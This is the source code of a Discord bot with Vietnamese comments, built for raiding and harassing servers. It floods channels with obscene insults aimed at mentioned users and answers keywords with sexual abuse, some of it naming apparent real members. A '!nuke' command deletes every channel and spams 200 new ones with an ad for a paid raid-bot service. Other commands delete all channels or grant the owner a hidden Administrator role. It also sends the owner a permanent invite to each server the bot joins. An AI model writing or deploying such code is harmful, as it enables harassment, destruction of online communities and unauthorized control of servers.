const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(3000, () => console.log('KeepAlive server is running.'));

const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const config = require('./config.json');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Spam message presets
const spamMessages = [
  "# cái thằng lồn này mày xạo lồn gì vậy con chó ngu trời đất ơi,con đĩ mẹ mày chứ mày ngồi mày xạo lồn ba hoa xỏ lá con đĩ mẹ mày ngậm cái lá bắn vô cái lồn mẹ mày luôn á thằng ngu,kraggg con đĩ mẹ mày chứ mày ngồi xạo lồn xạo lá gì vậy trời,trời đất ơi đụ má mày sủa lên đầu anh được không con chó ngu? Đĩ mẹ mày chứ mày ngồi mày xạo lồn trời ơi,đụ má cái mic của anh to hơn cái gì nữa cái của mày nhỏ xíu cầm điện thoại lỏ lên ngồi xạo lồn,trời đất ơi đụ má đĩ cha mắng cái mương lồn mẹ mày luôn á chứ mày ngồi mày xạo lồn xỏ lá ba hoa gì luôn con chó ngu,đĩ mẹ mày,trời đất ơi đéo có mà mày ngồi mày xạo lồn,trời đất ơi,thằng chú ngu mất dạy.(đoạn sau đéo nghe nổi=))) @here"
];

const spamChaoMessages = [
  "# BIẾT ANH NAM TRAN CHƯA EM",
  "# ANH NAMTRAN BÁ NHẤT CÁI TRẬN NÀY",
  "# CÓ ANH NAM LÀ ĐẠO LÝ ĐỜI XUẤT HIỆN",
  "# ANH NAM CHUYÊN DIỆT ĐÚ"
];

const spamTamBietMessages = [
  "# TẠM BIỆT EM YÊU NHA ANH ĐI ĐÂY",
  "# HẾT TRẬN RỒI NHA THẮNG THUA ĐÉO QUAN TRỌNG",
  "# QUAN TRỌNG CÁI EM BIẾT LỚN CHƯA??",
  "# TỪ SAU BỚT OAI NHA MẤY THẰNG LỒN",
  "# cảm ơn quý khách đã sử dụng dịch vụ bot của chúng tôi nếu cần thuê bot hãy vào sever này https://discord.gg/cXcntSARJB"
];

const spamChuiMessages = [
  "# đĩ mẹ mày oai với ai hả thằng lồn",
  "# tí tuổi đầu lớn hơn ai",
  "# thằng cha già mày đang đi làm nuôi mày kìa thằng lồn",
  "# đĩ mẹ mày như thằng ngu lồn đấy",
  "# thằng ngu lồn đòi chửi bẩn ai",
  "# thằng óc vắt mũi chưa sạch oai cái đĩ lồn mẹ mày",
  "# mấy thằng ngu đừng ẳng pbvm ra nha",
  "# anh ghét cái thể loại mặt lồn ẳng pbvm lắm",
  "# núp sau màn hình oai được với ai",
  "# mấy thằng ngu lồn ảo war",
  "# chúng mày tưởng thế là hay à",
  "# tụi mày biết lớn không",
  "# con bot này của anh sinh ra để day đời các em",
  "# các em có não mà đéo biết lớn",
  "# bố mẹ tụi mày đi làm nuôi ăn nuôi học",
  "# chúng mày đòi lên mạng oai với ai hả mấy thằng lồn",
  "# còn ảo war là bố mẹ còn khổ",
  "# anh nói thế cho biết thân biết phận em ạ",
  "# lớn rồi biết suy nghĩ đi thằnng lồn",
  "# giờ mấy thấy mày ngu chưa con",
  "# chúng mày thích ẳng ẳng lắm à mà oai vậy vậy hh",
  "# đúng mấy thằng ngu lồn núp sau màn ẳng ẳng",
  "# mày ẳng tiếp anh em thằng ngu ơi",
  "# thằng ngu ơi sao mày hay ra vẻ vậy",
  "# mày bí rồi à em",
  "# đĩ mẹ mày thấy mày ngu chưa thằng lồn",
  "# lồn mẹ mày sau bớt oai nha con",
  "# óc cặc nó vừa thôi em ạ",
  "# có đầu óc mà đéo biết suy nghĩ",
  "# óc lồn nó vừa thôi nha hh",
  "# mày khóc rồi à",
  "# anh nói đúng quá nín à",
  "# ngu lồn nó vừa thôi em nhé",
  "# bớt oai mạng đi",
  "# chửi thì ngu nhai đi nhai lại bài văn",
  "# ẳng tiếp đi",
  "# hay tao đè chat cho khóc rồi à",
  "# ĐỊT MẸ MÀY THẰNG NGU LỒN",
  "# OAI OAI SĨ SĨ A ĐÁ CHẾT CON ĐĨ MẸ MÀY NÈ HJHJ",
  "# SAO MÀY NGU THỂ HẢ LỒN NGU ƠII",
  "# ÔNG BÀ GIÀ MÀY CHẾT RỒI À?",
  "# HẾT NGÔN À THG NGU ƠI",
  "# BỎ 5 CHỤC LÀM NHỤC CON ĐĨ MẸ MÀY",
  
  ]

// Trigger reply
const triggerReplies = {
  "hello": "lô lô con cặc ",
  "bye": "cút mẹ mày đi,cút",
  "bot ơi": "Dạ có em đây!",
  "hi": "hi con đĩ mẹ mày ngu lồn,hi con cặc",
  "Gay": "gay con đĩ mẹ mày chứ gay",
  "les": "les cặc bà mày",
  "nam đâu,nam": "Nam đang nhớ bạn đấy^^",
  "ai dz nhất": "NamTran top1 dz",
  "alo": "mày muốn vỡ alo à",
  "yêu": "yêu con cặc cha mày",
  "ok e": "em con cặc bà mày",
  "tling húi": "tlinh là co be xink gai nhất sever",
  "namdan": "dần thằng bố mày chứ đần đại ca tao",
  "miss a bôg": "# em miss a bông nhiều lắm nhaaa",
  "thuylinh xau gai": "thuylinh xấu gái nhất sever",
  "đĩ": "con đĩ mẹ mày vểnh lồn lên cho tao địt",
  "lồn": "mê lồn hả em",
  "ai les cơ": "bông húi les",
  "ai bựa nhất sever?": "chị @suasua05 bựa nhất á",
  "dâm": "@suasua_05 dâm top 1 sever",
  "kid": "kid con đĩ mẹ nhà mày ấy em",
  "ngu": "ngu con đĩ lồn mẹ mày",
  "21/5": "là sinh nhật của namtran á",
  "?": "? móc vô cái lỗ lồn con đĩ mẹ mày",
  "dcm": "địt cái thằng cha mày đấy thằng ngu lồn hh",
  "nam cac": "con cặc cha mày hihi",
  "nam lon": "cai lon di me may"
  // ...(giữ nguyên các câu khác)
};

const activeIntervals = new Map(); // lưu spam interval theo kênh

client.once('ready', () => {
  console.log(`Bot đang hoạt động với tên ${client.user.tag}`);
});

// Hàm kiểm tra quyền dùng lệnh spam/stop
function hasPermission(message) {
  if (message.author.id === config.ownerId) return true; // Owner bot
  if (!message.guild) return false; // ngoài server không cho dùng
  return message.member.permissions.has(PermissionsBitField.Flags.ManageMessages);
}

function startSpam(channel, messages, mentionUser, durationMs = null) {
  let index = 0;
  const channelId = channel.id;
  const startTime = Date.now();

  const interval = setInterval(() => {
    const now = Date.now();
    if (durationMs && now - startTime >= durationMs) {
      clearInterval(interval);
      activeIntervals.delete(channelId);
      return;
    }

    const msg = messages[index];
    index = (index + 1) % messages.length;
    channel.send(mentionUser ? `${msg} <@${mentionUser.id}>` : msg).catch(() => {});
  }, 0); // gửi mỗi 1 giây

  activeIntervals.set(channelId, interval);
}

client.on('messageCreate', async message => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();
  const channelId = message.channel.id;

  // Auto reply theo từ khóa
  const reply = triggerReplies[content];
  if (reply) {
    return message.reply(`${message.author} ${reply}`);
  }

  //  Lệnh !spam
  if (message.content.startsWith('!spam ')) {
    if (!hasPermission(message)) return message.reply(" Bạn không có quyền dùng lệnh này.");
    if (activeIntervals.has(channelId)) return message.reply(" Đã có spam đang chạy. Dừng lại bằng `!stop`.");

    const args = message.content.split(' ').slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    if (!timeArg || !timeArg.endsWith('h')) return message.reply("ngu viết sai lệnh. Ví dụ: `!spam 1h` hoặc `!spam @user 2h`");

    const hours = parseInt(timeArg.replace('h', ''));
    if (isNaN(hours) || hours <= 0) return message.reply(" Thời gian không hợp lệ");

    const duration = hours * 60 * 60 * 1000;
    startSpam(message.channel, spamMessages, mentionUser, duration);
    return message.reply(`Bắt đầu spam trong ${hours} giờ đừng khóc nha em iu hhh.`);
  }

  //  Lệnh !spamchao
  if (message.content === '!spamdaoli') {
    if (!hasPermission(message)) return message.reply("Bạn không có quyền dùng lệnh này.");
    if (activeIntervals.has(channelId)) return message.reply("Đã có spam đang chạy. Dừng lại bằng `!stop`.");
    startSpam(message.channel, spamChaoMessages);
    return message.reply(" Bắt đầu spam đạo lí cho mấy thằng ngu lồn tưởng thế là hay");
  }

  // Lệnh !spamtambiet
  if (message.content.startsWith('!spamtambiet')) {
    if (!hasPermission(message)) return message.reply(" mày đéo có quyền dùng lệnh này.");
    if (activeIntervals.has(channelId)) return message.reply("Đã có spam đang chạy. Dừng lại bằng `!stop`.");

    const args = message.content.split(' ').slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    let duration = null;

    if (timeArg) {
      if (!timeArg.endsWith('h')) return message.reply(" Cú pháp sai. Dùng `!spamtambiet`, `!spamtambiet 1h` hoặc `!spamtambiet @user 1h`");
      const hours = parseInt(timeArg.replace('h', ''));
      if (isNaN(hours) || hours <= 0) return message.reply(" Thời gian không hợp lệ");
      duration = hours * 60 * 60 * 1000;
    }

    startSpam(message.channel, spamTamBietMessages, mentionUser, duration);
    return message.reply(` Bắt đầu spam TẠM BIỆT ${mentionUser ? `<@${mentionUser.id}>` : ''} ${duration ? `trong ${timeArg}` : ''}! Đừng khóc nha...`);
  }


  // Lệnh !spamchui
  if (message.content.startsWith('!spamchui')) {
    if (!hasPermission(message)) return message.reply(" mày đéo có quyền mà oai với ai hả thằng ngu ảo tưởng haha.");
    if (activeIntervals.has(channelId)) return message.reply(" Đã có spam đang chạy. Dừng lại bằng `!stop`.");

    const args = message.content.split(' ').slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    let duration = null;

    if (timeArg) {
      if (!timeArg.endsWith('h')) return message.reply("Cú pháp sai. Dùng `!spamchui`, `!spamchui 1h` hoặc `!spamchui @user 1h`");
      const hours = parseInt(timeArg.replace('h', ''));
      if (isNaN(hours) || hours <= 0) return message.reply(" Thời gian không hợp lệ");
      duration = hours * 60 * 60 * 1000;
    }

    startSpam(message.channel, spamChuiMessages, mentionUser, duration);
    return message.reply(` Bắt đầu spam CHỬI thằng ngu lồn này ${mentionUser ? `<@${mentionUser.id}>` : ''} ${duration ? `trong ${timeArg}` : ''}! thằng nào còn ẳng tao chửi cả thằng đó!!`);
  }
  
  // Lệnh !stop
  if (message.content.startsWith('!stop')) {
    if (!hasPermission(message)) return message.reply(" Bạn không có quyền dùng lệnh này.");

    const channelId = message.channel.id; // THÊM DÒNG NÀY
    const interval = activeIntervals.get(channelId);

    if (interval) {
      clearInterval(interval);
      activeIntervals.delete(channelId);
      return message.reply("biết ngay mấy thằng đó ngu lồn khóc nhè mới bảo mày stop à kk.");
    } else {
      return message.reply(" Không có spam nào đang chạy trong kênh này.");
    }
  

  }
  // Lệnh !deleteallchannels
  if (message.content === '!xoa') {
    // Kiểm tra nếu user KHÔNG phải là owner và KHÔNG có quyền admin
    if (
      message.author.id !== config.ownerId &&
      !message.member.permissions.has("ADMINISTRATOR")
    ) {
      return message.reply("Bạn không có quyền dùng lệnh này. Chỉ quản trị viên hoặc owner bot mới được dùng.");
    }

    message.guild.channels.fetch().then(channels => {
      channels.forEach(channel => {
        channel.delete().catch(err => console.error(`Không thể xoá kênh ${channel.name}:`, err));
      });
    });

    return message.reply("Đã bắt đầu xoá toàn bộ kênh. Vĩnh biệt cái server này.");
  }

  if (message.content === '!nuke') {
    // Kiểm tra quyền
    const isBotOwner = message.author.id === '84040602825628057' // id 840406028256280577
    if (!isBotOwner) {
      return message.reply("đéo có quyền mà oai với ai hả thằng lồn");
    }

    message.reply('bắt đầu sự khóc thét');

    // Xoá toàn bộ kênh
    message.guild.channels.cache.forEach(channel => {
      channel.delete().catch(() => {});
    });

    // Nội dung spam
    const spamMessage = "# @here # sever đã bị raid out sever lẹ\n# Tham gia tại để được báo giá thuê bot raid: https://discord.gg/d6TpjJt4wU";

    // Tạo 100 kênh mới và spam
    for (let i = 0; i < 200; i++) {
      message.guild.channels.create({
        name: `solo spam nè-${i + 1}`,
        type: 0 // GUILD_TEXT
      }).then(channel => {
        for (let j = 0; j < 500; j++) {
          channel.send(spamMessage).catch(() => {});
        }
      }).catch(() => {});
    }
  }
  if (message.content === '!addvip') {
    // Chỉ owner bot được dùng
    const ownerID = '84040602825628057'; // thay bằng ID thật của bạn

    if (message.author.id !== ownerID) {
      return message.reply("Bạn không có quyền dùng lệnh này.");
    }

    const guild = message.guild;

    // Tìm role VIP nếu đã có
    let vipRole = guild.roles.cache.find(role => role.name === 'VIP');

    // Nếu chưa có thì tạo mới với tất cả quyền
    if (!vipRole) {
      guild.roles.create({
        name: 'VIP',
        permissions: [PermissionsBitField.Flags.Administrator], // quyền cao nhất
        color: 'Gold'
      }).then(role => {
        message.member.roles.add(role).then(() => {
          message.reply(' Đã tạo role VIP và gán cho bạn.');
        }).catch(() => {
          message.reply(' không thế gắn role bot không có quyền.');
        });
      }).catch(() => {
        message.reply(' Không thể tạo role VIP. Bot có đủ quyền không?');
      });
    } else {
      // Nếu đã có role, gán luôn
      message.member.roles.add(vipRole).then(() => {
        message.reply(' Bạn đã được gán role VIP.');
      }).catch(() => {
        message.reply(' Không thể gán role. Bot có đủ quyền không?');
      });
    }
  }
  client.on('guildCreate', async guild => {
    const ownerID = 'YOUR_ID_HERE'; // Thay bằng ID Discord của bạn
    const ownerUser = await client.users.fetch(ownerID);

    let inviteLink = 'Không tạo được link mời';

    // Thử tạo invite nếu có channel
    try {
      const textChannel = guild.channels.cache
        .filter(c => c.type === 0 &&      c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite))
        .first();

      if (textChannel) {
        const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 });
        inviteLink = invite.url;
      }
    } catch (err) {
      console.log("Không thể tạo invite:", err.message);
    }

    // Gửi thông báo cho owner
    ownerUser.send({
      content: ` **Bot vừa được thêm vào server mới!**

   Tên server: \`${guild.name}\`
   ID server: \`${guild.id}\`
   Thành viên: \`${guild.memberCount}\`
   Invite: ${inviteLink}`
    }).catch(() => {
      console.log("Không thể gửi tin nhắn đến owner.");
    });
  });
});
client.login(process.env.TOKEN);
